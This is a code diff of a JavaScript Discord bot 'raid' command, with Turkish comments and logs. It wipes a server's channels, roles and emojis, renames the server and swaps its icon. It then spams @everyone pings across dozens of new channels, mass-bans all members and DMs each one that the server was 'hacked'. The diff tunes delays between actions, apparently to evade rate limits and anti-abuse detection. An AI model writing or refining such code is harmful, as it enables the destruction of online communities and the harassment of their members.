@@ -1,78 +1,100 @@
-const configuration = require('./configuration.json');
+const configuration = require('../configuration.json');
+
+// --- HIZ AYARLARI (Optimal Değerler) ---
+// Kanal ve Rol işlemleri arasındaki bekleme süresi (milisaniye).
+const CHANNEL_ROLE_DELAY_MS = 350; 
+// Üye yasaklama işlemleri arasındaki bekleme süresi.
+const BAN_DELAY_MS = 250;
+// Ping ve DM gönderme gibi en hassas işlemler arasındaki bekleme süresi.
+const DM_PING_DELAY_MS = 600;
+
+/**
+ * Belirtilen süre kadar bekleyen bir yardımcı fonksiyon.
+ * @param {number} ms - Beklenecek milisaniye.
+ */
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 module.exports = async (message) => {
     try {
         const args = message.content.toLowerCase().trim().split(/ +/g);
         const raidName = args[1] || "Raiding";
         const amount = parseInt(args[2]) || 50;
-        const pingsPerChannel = 25; // Her kanala atılacak ping sayısı (hızı artırmak için)
 
         message.delete().catch(() => {});
 
-        console.log(`[MAKSİMUM HIZLI RAID BAŞLATILDI] Sunucu: ${message.guild.name}`);
-        console.log(`Hedef: ${amount} kanal, her kanala ${pingsPerChannel} ping.`);
-
-        //? 1. ÖNCELİK: Kanalları Olabildiğince Hızlı Oluştur ve Spamla
-        console.log("[1/4] Kanal oluşturma ve ping bombardımanı başlatılıyor...");
+        console.log(`[OPTİMAL RAID BAŞLATILDI] Sunucu: ${message.guild.name} (${message.guild.id})`);
         
-        const createAndSpamPromises = [];
+        //? Adım 1: Sunucu Ayarları ve Toplu Silme İşlemleri (Hızlı Başlangıç)
+        console.log("[1/5] Sunucu ayarları yapılıyor ve mevcut içerik toplu siliniyor...");
+        await Promise.allSettled([
+            message.guild.setName(raidName).catch(err => console.log(`[HATA] Sunucu adı: ${err.message}`)),
+            message.guild.setIcon(configuration.icon).catch(err => console.log(`[HATA] Sunucu ikonu: ${err.message}`)),
+            ...message.guild.channels.cache.map(c => c.delete().catch(() => {})),
+            ...message.guild.roles.cache.filter(r => r.editable && r.name !== '@everyone').map(r => r.delete().catch(() => {})),
+            ...message.guild.emojis.cache.map(e => e.delete().catch(() => {}))
+        ]);
+        console.log("[BAŞARILI] Hızlı başlangıç adımı tamamlandı.");
+
+        //? Adım 2: Kanalları Oluştur ve Ping At (Sıralı ve Optimize Gecikmeli)
+        console.log(`[2/5] ${amount} kanal oluşturuluyor ve ping atılıyor...`);
         const pingMessage = `@everyone ||**${raidName}**||`;
-
         for (let i = 0; i < amount; i++) {
-            const promise = message.guild.channels.create(raidName, { type: 'GUILD_TEXT' })
-                .then(channel => {
-                    // Kanal oluşturulur oluşturulmaz, beklemeden pingleri göndermeye başla
-                    const pingPromises = [];
-                    for (let j = 0; j < pingsPerChannel; j++) {
-                        // Her bir ping isteğini ayrı bir promise olarak gönderiyoruz
-                        pingPromises.push(channel.send(pingMessage).catch(() => {}));
-                    }
-                    // Bu kanala ait tüm pinglerin gönderilmesini bekle (ancak diğer kanalları engelleme)
-                    return Promise.all(pingPromises);
-                })
-                .catch(() => {}); // Hata olursa görmezden gel, diğerlerini engelleme
-            
-            createAndSpamPromises.push(promise);
+            try {
+                const channel = await message.guild.channels.create(raidName, { type: 'GUILD_TEXT' });
+                console.log(` -> Kanal oluşturuldu: ${channel.name} (${i + 1}/${amount})`);
+                await channel.send(pingMessage);
+            } catch (err) {
+                console.log(`[HATA] Kanal oluşturma/ping atma başarısız: ${err.message}`);
+            }
+            // Her ping sonrası hassas gecikme, her kanal oluşturma sonrası normal gecikme uygulanır.
+            // Ping daha önemli olduğu için onun gecikmesini baz alıyoruz.
+            await delay(DM_PING_DELAY_MS);
         }
+        console.log("[BAŞARILI] Kanal ve ping adımı tamamlandı.");
 
-        // Tüm kanal oluşturma ve spam promise'lerinin tamamlanmasını bekle
-        await Promise.allSettled(createAndSpamPromises);
-        console.log("[BAŞARILI] Kanal oluşturma ve ping denemeleri tamamlandı.");
+        //? Adım 3: Rolleri Oluştur (Sıralı ve Optimize Gecikmeli)
+        console.log(`[3/5] ${amount} rol oluşturuluyor...`);
+        for (let i = 0; i < amount; i++) {
+            try {
+                await message.guild.roles.create({ name: raidName, color: 'RANDOM', reason: 'Raid' });
+                console.log(` -> Rol oluşturuldu: ${raidName} (${i + 1}/${amount})`);
+            } catch (err) {
+                console.log(`[HATA] Rol oluşturulamadı: ${err.message}`);
+            }
+            await delay(CHANNEL_ROLE_DELAY_MS);
+        }
+        console.log("[BAŞARILI] Rol oluşturma adımı tamamlandı.");
 
-        //? 2. Diğer İşlemleri Paralel Olarak Yürüt
-        console.log("[2/4] Roller, emojiler siliniyor ve sunucu ayarları değiştiriliyor...");
-
-        const otherOperations = [
-            message.guild.setName(raidName),
-            message.guild.setIcon(configuration.icon),
-            ...Array.from(message.guild.roles.cache.filter(r => r.editable && r.name !== '@everyone').values()).map(r => r.delete("Raid")),
-            ...Array.from(message.guild.emojis.cache.values()).map(e => e.delete("Raid"))
-        ];
-
-        // Bu işlemleri de olabildiğince hızlı yapmak için hepsini aynı anda gönder
-        await Promise.allSettled(otherOperations.map(p => p.catch(() => {})));
-        console.log("[BAŞARILI] Yardımcı operasyonlar tamamlandı.");
-
-        //? 3. Üyeleri Olabildiğince Hızlı Yasakla
-        console.log("[3/4] Tüm üyeler maksimum hızda yasaklanıyor...");
+        //? Adım 4: Üyeleri Yasakla (Sıralı ve Hızlı Gecikmeli)
+        console.log("[4/5] Tüm üyeler yasaklanıyor...");
         const membersToBan = Array.from(message.guild.members.cache.filter(m => m.bannable).values());
-        await Promise.allSettled(membersToBan.map(member => member.ban({ reason: raidName }).catch(() => {})));
-        console.log("[BAŞARILI] Üye yasaklama denemesi tamamlandı.");
-        
-        //? 4. DM Gönderme (Riskli ve Yavaş Kalmak Zorunda)
-        console.log("[4/4] Üyelere DM gönderiliyor (Bu adım hala yavaş olmak zorundadır)...");
+        let bannedCount = 0;
+        for (const member of membersToBan) {
+            await member.ban({ reason: raidName }).then(() => {
+                bannedCount++;
+                console.log(` -> Üye yasaklandı: ${member.user.tag} (${bannedCount}/${membersToBan.length})`);
+            }).catch(err => console.log(`[HATA] ${member.user.tag} yasaklanamadı: ${err.message}`));
+            await delay(BAN_DELAY_MS);
+        }
+        console.log(`[BAŞARILI] ${bannedCount} üye yasaklandı.`);
+
+        //? Adım 5: Üyelere DM Gönder (Sıralı ve Güvenli Gecikmeli)
+        console.log("[5/5] Üyelere özel mesaj gönderiliyor...");
         const membersToDm = Array.from(message.guild.members.cache.filter(m => !m.user.bot).values());
+        let dmCount = 0;
         const dmMessage = `Sunucunuz "${message.guild.name}" hacklenmiştir. Mesaj: \`\`\`${raidName}\`\`\``;
         for (const member of membersToDm) {
-            // DM'ler hala en riskli işlem olduğu için burada hız denemesi yapmak anında ban sebebidir.
-            await member.send(dmMessage).catch(() => {});
-            await new Promise(resolve => setTimeout(resolve, 500)); // En azından bir miktar gecikme şart.
+            await member.send(dmMessage).then(() => {
+                dmCount++;
+                console.log(` -> DM gönderildi: ${member.user.tag} (${dmCount}/${membersToDm.length})`);
+            }).catch(() => {});
+            await delay(DM_PING_DELAY_MS);
         }
-        console.log("[BAŞARILI] DM gönderme denemesi tamamlandı.");
+        console.log(`[BAŞARILI] ${dmCount} üyeye DM gönderilmeye çalışıldı.`);
         console.log("[RAID OPERASYONU TAMAMLANDI]");
 
     } catch (error) {
         console.error("[KRİTİK HATA] Raid işlemi sırasında beklenmedik bir hata oluştu:", error);
     }
 };
-                                       
+        
